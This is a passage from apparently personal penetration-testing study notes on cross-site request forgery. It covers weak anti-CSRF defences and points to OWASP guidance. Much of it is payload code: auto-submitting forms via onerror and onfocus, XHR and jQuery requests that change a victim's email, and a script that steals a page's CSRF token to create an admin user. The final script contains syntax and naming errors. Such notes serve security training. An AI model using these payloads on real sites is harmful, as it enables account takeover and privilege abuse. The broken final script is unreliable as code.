</code></pre><p id="23451aa2-4c19-4fed-93f9-a501a9d56bf2" class="">We can use event handlers such as <strong>onload</strong> and <strong>onerror</strong> because they do not require user interaction:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e217f3ad-72e7-47e5-9d4e-792c446cb345" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=&quot;CSRForm.submit();&quot;&gt;
</code></pre><p id="5c29e1cb-2356-400e-9507-4481b5d96d9e" class="">in HTML5 we can use <strong>autofocus</strong> and the related event handler <strong>onfocus</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e269ac06-1fb4-41e7-8421-dfeb79165d02" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;input name=&quot;new&quot; value=&quot;evil@hacker.site&quot; autofocus onfocus=&quot;CSRForm.submit()&quot;&gt;
</code></pre><h3 id="857fa14e-22de-49ee-9627-adfc8c0b5458" class=""><strong>How to perform POST requests silently</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#how-to-perform-post-requests-silently"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1d6b9c38-f0f4-4296-a1c2-b9f8c39be7ff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;iframe style=&quot;display:none&quot; name=&quot;CSRFrame&quot;&gt;&lt;/iframe&gt;

# in the form we add target=&quot;CSRFrame&quot;
# display the response received submitting the form in the iframe
</code></pre><p id="48b1ae5c-ae9d-4307-a9d4-57ad11a685a3" class="">Can be forged using XMLHttpReques(<strong>XHR</strong>) also:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a22830f1-82b5-45c7-bebf-836123085615" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">var url=&quot;URL&quot;;
var params = &quot;old=mycoolemail@victim.site&amp;new=eviL@hacker.site&quot;;
var CSRF = new XMLHttpRequest();
CSRF.open(&quot;POST&quot;, url, false);
CSRF.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
CSRF.send(params)
</code></pre><p id="b665b455-b5c0-43ef-add8-805d7d6ed07c" class="">Can also be done using JavaScript libraries such as JQuery:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c1a549d6-ef49-4fb2-941d-5f9fa825a3fe" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$.ajax({ type: &quot;POST&quot;, url: &quot;URL&quot;, data: &quot;old=mycoolemail@victim.site&amp;new=eviL@hacker.site&quot;,});
</code></pre><h2 id="00c69cb4-3bbd-4c6f-96dd-d4861b1c713e" class=""><strong>Exploiting Weak Anti-CSRF Measures</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#exploiting-weak-anti-csrf-measures"></a></strong></h2><h3 id="981ecd8c-cc17-4964-bbdb-1fb348356dca" class=""><strong>Using POST-only Requests</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#using-post-only-requests"></a></strong></h3><ul id="3fd6159d-6a7a-41a2-8e75-7c92f7a574cd" class="bulleted-list"><li style="list-style-type:disc">Get requests can be cached, bookmarked, etc. It should not be used For operations that cause a state to change. These may include functionality like database operations, writings files, etc.</li></ul><ul id="1d0215ef-9642-42be-991e-3f215670d767" class="bulleted-list"><li style="list-style-type:disc">POST requests For sensitive informations is better practice and protects against a well-known class of CSRF attack vectors.</li></ul><h3 id="3dc9ba35-f8dc-4354-ade9-6860b196fa16" class=""><strong>Multi-Step Transactions</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#multi-step-transactions"></a></strong></h3><ul id="5ddc5a84-81d9-4c22-8a0a-a29a816502c9" class="bulleted-list"><li style="list-style-type:disc">As long as we are able to either predict or deduce the steps necessary to complete a task, then CSRF is possible.</li></ul><ul id="7f2d3f27-4d00-4c6b-a634-3c244756f8f0" class="bulleted-list"><li style="list-style-type:disc">IF the app implements multi=step transactions, these are in no way a protection mechanism.</li></ul><h3 id="7da96322-f6db-43b6-b410-79bfda7013ce" class=""><strong>Checking Referer Header</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#checking-referer-header"></a></strong></h3><ul id="956aadbe-6609-4c3a-a7f0-9eaecf505609" class="bulleted-list"><li style="list-style-type:disc">It allows a server to check where a request was orifinated and therefore perform logging, optimized chaching. etc.</li></ul><ul id="ad62698c-c496-4076-b26c-ba5dd1014735" class="bulleted-list"><li style="list-style-type:disc">Some implementation mistakens are that the referrer not being sent if the website is using SSL/TLS. This does not take into consideration that firewalls, corporate proxies, etc, might remove this header</li></ul><ul id="da420d37-08fe-44e9-9039-cc5b2adb9039" class="bulleted-list"><li style="list-style-type:disc">It can help in detecting some attacks. However, it will not stop all attacks. An example is an XSS flaw in the same origin.</li></ul><h3 id="be6b8abe-8fee-4063-a557-e290960a3688" class=""><strong>Predicatable Anti-CSRF Token</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#predicatable-anti-csrf-token"></a></strong></h3><ul id="9af930dc-411c-490e-8108-f35bb1f0e8fb" class="bulleted-list"><li style="list-style-type:disc">One of the most effective solutions For reducing the likelihood of CSRF exploitation is to use a Synchronizer Token Pattern, commonly called anti-CSRF Tokens.</li></ul><ul id="9f5f904c-e66d-47c9-892a-d726dacc4256" class="bulleted-list"><li style="list-style-type:disc">This design pattern requires the generating of a challenge token that will be inserted within the HTML page. Another countermeasure might be SameSite Cookie.</li></ul><p id="1915eeea-683d-4512-82b5-0cc2112937b3" class="">Synchronizer Token Pattern: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</p><p id="f0387d66-b72c-44fd-b137-18c30a73365c" class="">sameSite Cookie: https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7</p><blockquote id="3f93f625-9bb0-4c31-85db-fda978452c3a" class="">its essential that the token values are randomly generated</blockquote><h3 id="4d615030-214c-4653-ac89-79e40085ec1f" class=""><strong>Unverified Anti-CSRF Token</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#unverified-anti-csrf-token"></a></strong></h3><p id="beffb672-eff4-4d47-b7af-0b03dfe27a1a" class="">Another possible scenario is when the application implements strong Anti-CSRF tokens but lacks the verification server-side.</p><h3 id="14691634-97b6-4221-ab41-3faf4075af1d" class=""><strong>Secret Cookies</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#secret-cookies"></a></strong></h3><p id="1e812af2-1f0c-4f69-804b-2c362217a226" class="">The concept with this technique is to create a cookie containing secret information (MD5 hash of a random secret) and then check if its included in the users request.</p><p id="eb8ec03e-7535-4d37-91a7-c7b92efa2513" class="">Clearly, this is not in any way a security measure. Cookies, both by specification and design, are sent with every request. Therefore, once a user sets a cookie, they are passed to the site/app no matter what, regardless of user intention.</p><h2 id="a747ec25-bb36-4ba3-8381-64e6bb34b7db" class=""><strong>Advanced CSRF Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#advanced-csrf-exploitation"></a></strong></h2><h3 id="a4b4cf4f-ffb1-4e7f-b622-40ec7c20a5d5" class=""><strong>Bypassing CSRF Defenses with XSS</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#bypassing-csrf-defenses-with-xss"></a></strong></h3><p id="bcb03ef5-ee59-4bb3-9549-053c772a817a" class="">A single XSS flaw is like a storm that overwhelms the entire CSRF protection system.</p><blockquote id="66bd65cc-f98f-435b-af51-b0e78299cec0" class="">Technically, once we have exploited an XSS flaw, we are in the same origin of the CSR. All defenses against CSRF, except Challenge-Response mechanisms, are useless.</blockquote><p id="480a6c62-b084-4d78-96ec-7f81b02f2347" class="">Can be Bypassed:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e2b323bc-43c1-4e74-bdd4-17b40a42d222" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Synchronized token
- Checking the Referer Header
- Checking the Origin Header
</code></pre><p id="b6c90398-0b61-44a9-a8d6-d762ab018043" class="">→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern</p><p id="8e199e2e-b33d-4c69-a1ee-da158cfff0b6" class="">→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers</p><p id="abb8d2df-ae51-496a-89fc-c6999b2c587f" class="">→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers</p><h3 id="b9843072-bee4-445d-ac26-e80b37bf3d5d" class=""><strong>Bypassing Header Checks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#bypassing-header-checks"></a></strong></h3><p id="4a35d101-dccf-40f0-9b00-c25f97dc158f" class="">Checking Referer and Origin header simply means that the request must come from a proper origin.</p><blockquote id="012031c1-e562-467a-95e8-9b35ce08516b" class="">Bypassing these types of defenses measures are straightforward as long as we have effectively exploited an XSS vulnerability.</blockquote><h3 id="7127e051-eae2-4150-8d10-c77fc9796d70" class=""><strong>Bypassing Anti-CSRF Token</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#bypassing-anti-csrf-token"></a></strong></h3><p id="015f70f6-0c6c-491d-bd1a-e021f38cf53b" class="">We need to hijack the anti-csrf token from a valid form and then use the token stolen in our forged form.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7150bc32-dff7-4c66-bf5d-a9868b461803" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Once the XSS has been detected &gt; Two scenarios:
1 - Occurs when XSS and CSRF-protected forms are contained on the same page
2 - XSS flaw is located in another part of the web application
</code></pre><p id="6729f586-d859-45d8-a627-26b6f784513b" class="">Steps to bypass anti-CSRF mechanisms:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de0d6499-5471-4102-acbd-1c27238441fc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Useless if the XSS is in the same page
- 1. Request a valid form (with a valid token)
- 2. Extract the valid token from the source code
- 3. Forge the form with the stolen token
</code></pre><h2 id="3b2e7749-0037-4928-887b-9d71444d8b37" class=""><strong>CSRF in 3 Steps</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#csrf-in-3-steps"></a></strong></h2><h3 id="3f639533-be48-4a48-91fc-64ae9407b98b" class=""><strong>1 - Request a valid form with a valid Token</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#1---request-a-valid-form-with-a-valid-token"></a></strong></h3><p id="302785da-52da-43b5-822c-975e05dbe771" class="">We need the HTML of the page where the target form is located.</p><ul id="ea8b3b79-de2a-4883-85ec-5ff8cb46d62c" class="bulleted-list"><li style="list-style-type:disc">Worst case scenario, the XSS is not located on the same page of the target form; therefore, we can not access the DOM directly using JavaScript. Thus, we need to GET the HTML source of the page.</li></ul><ul id="76a15535-dd67-4dda-b3e2-e99f2cc27dba" class="bulleted-list"><li style="list-style-type:disc">To get the pages HTML using XMLHttpRequest is simple:</li></ul><p id="91a054e0-d456-4408-80cf-3f185a9ace28" class="">→ http://xhr.spec.whatwg.org/</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="48f8d073-d745-44f0-a80c-5833b04aade3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if(xhr.readyState == 4) {
    var htmlSource = xhr.responseText; // the source code
    // some operations
  }
}
xhr.open(&#x27;GET&#x27;,&#x27;http://victim.site/csrf-form-page.html&#x27;, true);
xhr.send();
</code></pre><blockquote id="ad17b786-844f-40a2-969e-504544ffc1c9" class="">The first step is to request a valid form with a valid token by using some form of the following JQuery code:</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="595d79ab-df63-4ff0-bf29-db556f574a0c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">JReq = JQuery.get(&#x27;http://victim.site/csrf-form-page.html&#x27;, function() {
  var htmlSource = JReq.responseText; // the source code
  // some operations
  });
</code></pre><h3 id="83b80e59-ae6a-4355-a486-077fd9c66c5b" class=""><strong>2 - Extract the valid Token from the Source Code</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#2---extract-the-valid-token-from-the-source-code"></a></strong></h3><p id="c93846ef-ba4d-42ca-a2e6-7d091bf5c0e9" class="">in the best scenario, we can access the DOM quite easily:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="142a8933-c7bd-4440-81b5-5f8eb9a11f5c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">var token = document.getElementsByName(&#x27;csrf_token&#x27;)[0].value
</code></pre><p id="22cd689f-05fc-4997-96e6-77f748f42c9b" class="">Whereas, there are multiple options available to both inspect the string result and extract the anti-csrf token.</p><p id="a4810185-b54e-4796-9973-bf5f75d6b9fc" class="">THe first options is by using regex-based <strong>DOMParser API</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6f1ffbea-8382-4c72-843b-c4d2bcb904b5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://developer.mozilla.org/en-US/docs/Web/API/DOMParser
</code></pre><figure id="e65e4d10-eaed-45dc-9072-5c4384e26ac1" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/58.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/58.png"/></a></figure><h3 id="c12a949a-3392-4d3e-a871-9140a90f6054" class=""><strong>3 - Forge the Form with the Stolen Token</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#3---forge-the-form-with-the-stolen-token"></a></strong></h3><p id="d7826c44-d4b7-4c79-8dcc-63a9215b5eda" class="">Once we have a valid token, is to add the anti-csrf token in the forged form and send the attack by using the techniques we have seen in the previous sections.</p><h2 id="7bf986f9-d16b-4b7e-ae76-2acaafff11a6" class=""><strong>Bypassing Anti-CSRF Token Brute Forcing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#bypassing-anti-csrf-token-brute-forcing"></a></strong></h2><ul id="70d16960-6a6c-4b0e-9307-571f3086f1a3" class="bulleted-list"><li style="list-style-type:disc">The Anti-csrf tokens must be random and unpredictable. Otherwise it becomes expose to brute force attacks.</li></ul><ul id="1dbdca2f-839d-4d4a-ac3d-6e2f1dfa2852" class="bulleted-list"><li style="list-style-type:disc">If we are able to steal a vicitms valid cookie, we can use <strong>Burp Repeater</strong> or custom scripts like Ruby, Python or any other non-browser mechanisms to generate a tremendous number of requests.</li></ul><ul id="06d67245-64f0-44e0-879f-8768edfbbe89" class="bulleted-list"><li style="list-style-type:disc">Moreover in the video section</li></ul><p id="71fa9ebc-5ff3-464e-8d00-ee630ff42438" class="">In a scenario where we cant steal the victim session cookies:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4bfb88c3-d277-40bb-9dcd-d77f1d3e8fd8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Target users might be either convinced to visit our malicious page
- We can inject our malicious code and exploit an XSS flaw against these users.
- As a result we exploit the weak anti-CSRF protection
</code></pre><ul id="e73e8560-d156-46fb-a0fb-909c2beea25d" class="bulleted-list"><li style="list-style-type:disc">Lets consider an implementation that generates anti-CSRF tokens with a number value between 100 and 300. This is a poor leve of randomness, cause we can brute-force it.</li></ul><p id="3c10398c-dd4e-41f0-94fa-0cc962d040b1" class="">Exploiting this only requires us to create a page with a script that generates and submits 200 forms.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="895bcf25-ad3b-4cdc-9992-27fb2989dee8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- To submit a post we can use a form element
- XMLHttpRequest
</code></pre><ul id="b1dfc438-d902-4a5f-b3a8-815825661161" class="bulleted-list"><li style="list-style-type:disc">The implementation requires both a loop, in order to generate the number of requests needed, and a function that generates the same requests (except For the anti-CSRF token)</li></ul><figure id="a970d416-cce6-45e2-978a-1c6e6bc55369" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/56.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/56.png"/></a></figure><ul id="449c3704-5a7a-4583-ab35-13ae9ecca48e" class="bulleted-list"><li style="list-style-type:disc">In some cases, the vuln form may be using GET. We can use <strong>XHR</strong> again; There are also agreate deal of other native methods (IMG, etc)</li></ul><figure id="1c2ecbcd-73ce-4709-8b92-d31d36834019" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/57.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/57.png"/></a></figure><p id="c4453472-267d-4a97-b1dc-a7a9d624ee69" class="">Some real-world implementations of anti-CSRF appear to use a known Ajax request to get the token.</p><blockquote id="28b9d7cb-c83e-4dcc-a8ce-2ecdc84cc32c" class="">If u could iframe that particular functionality, you could narrow down a valid token by leveraging JavaScript and given that each char has a different size.</blockquote><h2 id="5406dfff-7893-444f-80b9-d47f90d29c60" class=""><strong>Video’s Notes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#videos-notes"></a></strong></h2><h3 id="2786615b-bfab-4689-afbb-2da8d1d5b7cf" class=""><strong>Advanced CSRF Exploitation - parte 1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#advanced-csrf-exploitation---parte-1"></a></strong></h3><p id="bad9d2c3-48db-4d30-b9b6-8fdc72b1890b" class="">This is a nice shopping site.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e60c2b84-171e-42e4-b107-e431b0864c83" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script type=&quot;text/javascript&quot;&gt;

var url = &quot;http://targeturl.site/add_user.php&quot;;
var params = &quot;name=Talent&amp;surname=John&amp;email=talent%40site.com&amp;role=ADMIN&amp;submit=&quot;;
# u can grab this param via BURP

var CSRF=new XMLHttpRequest();
CSRF.open(&quot;POST&quot;,url, true);
CSRF.withCredentials = &quot;true&quot;;
CSRF.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);
// u can grab the content-type via BURP
CSRF.send(params);
&lt;/script&gt;
</code></pre><h3 id="073fc63c-65fa-44e1-a0f2-1e3b81ba04d1" class=""><strong>bypass token</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#bypass-token"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="33a70cc5-68e9-437c-a8e5-9986ebb729b3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script type=&quot;text/javascript&quot;&gt;

function addUser(token)
{
  var url = &quot;http://targeturl.site/add_user.php&quot;;
  var params = &quot;name=Talent&amp;surname=John&amp;email=talent%40site.com&amp;role=ADMIN&amp;submit=&amp;CSRFToken=&quot; + token;

  var CSRF=new XMLHttpRequest();
  CSRF.open(&quot;POST&quot;,url, true);
  CSRF.withCredentials = &quot;true&quot;;
  CSRF.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);
  CSRF.send(params);
}

// extract the token
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function(){
  if(XHR.readyState == 4{
    var htmlSource = XHR.reponseText; // the source of users

    // extract the token
    var parser = new DOMParser().parseFromString(htmlSource, &quot;text/html&quot;);
    var token = parser.getElementById(&quot;CSRFToken&quot;).value;
    addUSer(token);
  }

}

XHR.open(&#x27;GET&#x27;, &#x27;targeturl.site&#x27;,true);
XHR.send();

&lt;/script&gt;
